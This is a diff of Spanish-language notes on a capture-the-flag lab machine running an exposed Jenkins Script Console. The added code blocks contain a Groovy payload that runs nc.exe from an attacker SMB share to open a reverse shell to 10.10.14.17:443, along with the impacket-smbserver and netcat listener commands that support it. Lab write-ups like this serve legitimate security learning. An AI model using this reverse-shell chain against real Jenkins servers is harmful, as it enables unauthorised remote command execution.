@@ -1,6 +1,6 @@
 ## Summary
 
-Tags: #Windows #Wfuzz  #Jenkins 
+Tags: #Windows #Wfuzz  #Jenkins #Groovy 
 
 - IP -> 10.10.10.63
 - Ports -> TCP (80,135,445,50000), UDP (idk)
@@ -52,7 +52,7 @@ Ahora toca investigar Jenkins:
 
 El error en la web de Jenkins es que te salga la opción: **Manage Jenkins**
 	- Ir a 'Script Console'
-	- Puedes crear un script en Groovy (Groovy execute shell command)
+	- Puedes crear un script en Groovy (Groovy execute shell command), lo buscamos en Google y lo colocamos en 'Script Console'
 ```bash 
 	❯ println "whoami".execute().text                    # Nos muestre el resultado de 'whoami'
 ```
@@ -63,16 +63,25 @@ El error en la web de Jenkins es que te salga la opción: **Manage Jenkins**
 ```
 
 ## User
-Webpage 
-	- Puedes crear un script en Groovy (Groovy execute shell command)
-		- **println "\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443".execute().text** Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443
 
-- Comando -> **impacket-server < FOLDERNAME> $(pwd) -smb2support** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
-- Comando -> **rlwrap nc -nlcp 443** Nos ponemos en escucha por el puerto 443 (Podemos hacer **Ctrl + l**, sin poder hacer **Ctrl + c**) maquinas Windows
+```bash 
+# Puedes crear un script en Groovy (Groovy execute shell command)
 
-nota: Si nos marca un error al moento de ejecutar la parte de la pagina web, debemos de escapar las barras agregando otra barra **\\**
+❯ println "\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443".execute().text  
 
-- Comando-> **dir /r /s user.txt** Para buscar un archivo dentro de Windows, nos regresa la ruta en donde se encuentra
+# Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443
+
+```
+
+```bash 
+# Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
+❯ impacket-smbserver smbFolder $(pwd) -smb2support        
+
+```
+
+```bash 
+❯ rlwrap nc -nlvp 443            # Nos ponemos en escucha por el puerto 443 
+```
 
 ## Root
 
